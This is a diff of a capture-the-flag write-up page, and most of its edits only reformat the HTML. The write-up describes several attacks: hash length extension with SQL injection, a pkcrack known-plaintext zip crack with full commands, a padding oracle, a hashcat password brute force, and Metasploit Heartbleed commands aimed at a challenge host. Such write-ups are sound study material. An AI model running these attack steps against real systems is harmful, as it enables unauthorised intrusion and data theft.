+&lt;span class=&quot;c&quot;&gt;# Enter :bountycon-3m:&lt;/span&gt;
+c 11 &lt;span class=&quot;c&quot;&gt;# gdb will be on breakpoint under the if condition as input is correct&lt;/span&gt;
 c
-# so on guess the whole flag.
+&lt;span class=&quot;c&quot;&gt;# so on guess the whole flag.&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Demo:&lt;/p&gt;
@@ -484,8 +504,7 @@ c
 https://178.128.95.74/ui/
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;After login into the website. On the website, there was a page that an admin could access only.
-Saying&lt;/p&gt;
+&lt;p&gt;After login into the website. On the website, there was a page that an admin could access only saying&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAGship product
 
 You're not ready.
@@ -512,9 +531,14 @@ Checking the source code I didn’t find anything special except &lt;code class=
 
 &lt;p&gt;There are two things to note.&lt;/p&gt;
 
-&lt;p&gt;1- Secret key concatenate with user email then MD5 is done.&lt;/p&gt;
-
-&lt;p&gt;2- SQL query is vulnerable to SQL Injection.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Secret key concatenate with user email then MD5 is done.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;SQL query is vulnerable to SQL Injection.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
 
 &lt;p&gt;After googling, I came to know that if the secret key is combined with a user-controlled message then it is vulnerable to a length extension attack. This means the attacker can make a valid hash of secret_cookie_key+new_message without knowing the secret_cookie_key(length of secret_cookie_key needed to be known which is not a big deal, we can try all lengths).&lt;/p&gt;
 
@@ -625,17 +649,17 @@ which contains the link to the software&lt;/p&gt;
 &lt;p&gt;And this works on AWS with Ubuntu. Same method wasn’t work on local kali Linux machine because you have to zip the plaintext file to crack password and zip program of ubuntu and kali wasn’t same(there is some difference). Protected files was zipped on Ubuntu.&lt;/p&gt;
 
 &lt;p&gt;On Ubuntu, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;https://github.com/keyunluo/pkcrack&lt;/code&gt; tool to get the password protected files.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir matt
-cd matt
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;matt
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;matt
 wget https://www.glue.bar/mattsstringreverser/matt-himself.jpg
-sudo zip a.zip matt-himself.jpg
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;zip a.zip matt-himself.jpg
 wget https://www.glue.bar/mattsstringreverser/version2-secret-preview.zip
 ../bin/extract a.zip matt-himself.jpg 
-mv matt-himself.jpg matt-himselfP.jpg
-mkdir ver2
+&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;matt-himself.jpg matt-himselfP.jpg
+&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;ver2
 ../bin/extract version2-secret-preview.zip ver2/matt-himself.jpg 
-mv ver2/matt-himself.jpg matt-himselfC.jpg
-../bin/pkcrack -c matt-himselfC.jpg -p matt-himselfP.jpg -C version2-secret-preview.zip -P a.zip -d matt-cracked.zip
+&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;ver2/matt-himself.jpg matt-himselfC.jpg
+../bin/pkcrack &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; matt-himselfC.jpg &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; matt-himselfP.jpg &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; version2-secret-preview.zip &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; a.zip &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; matt-cracked.zip
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_12.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
@@ -767,13 +791,17 @@ SyntaxError: Missing parentheses in call to 'print'. Did you mean print(ptext)?
 
 &lt;p&gt;On appending the &lt;code class=&quot;highlighter-rouge&quot;&gt;A&lt;/code&gt; of different length to msg parameter it gives three different messages.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1- Bad Base64
-
-2- Bad request: message padding error 
-
-3- SyntaxError: Missing parentheses in call to 'print'. Did you mean print(ptext)?
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Bad Base64&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Bad request: message padding error&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;SyntaxError: Missing parentheses in call to ‘print’. Did you mean print(ptext)?&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
 
 &lt;p&gt;Which leads me to padding oracle attack.&lt;/p&gt;
 
@@ -1021,7 +1049,7 @@ Tried &lt;code class=&quot;highlighter-rouge&quot;&gt;3&lt;/code&gt; for id para
 
 &lt;p&gt;URL decode the following &lt;code class=&quot;highlighter-rouge&quot;&gt;%3BFZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8%3D&lt;/code&gt; leads to &lt;code class=&quot;highlighter-rouge&quot;&gt;;FZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8=&lt;/code&gt; before &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; is username which is empty and then hmac-sha256 is done on username with some password which we dont know. But what if password is weak. Let’s bruteforce it.&lt;/p&gt;
 
-&lt;p&gt;I hashcat with &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; file and found the password which was &lt;code class=&quot;highlighter-rouge&quot;&gt;ilovefacebook&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;I used hashcat with &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; file and found the password which was &lt;code class=&quot;highlighter-rouge&quot;&gt;ilovefacebook&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/Screenshot_29.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
@@ -1190,10 +1218,10 @@ My solution uses eval to execute a string.&lt;/p&gt;
 &lt;p&gt;Just do the heartbleed attack to get the flag.&lt;/p&gt;
 
 &lt;p&gt;On metasploit&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use auxiliary/scanner/ssl/openssl_heartbleed
-set rport 443
-set rhosts ec2-3-11-22-12.threat.studio
-set verbose True
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use auxiliary/scanner/ssl/openssl_heartbleed
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;rport 443
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;rhosts ec2-3-11-22-12.threat.studio
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;verbose True
 check
 exploit
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
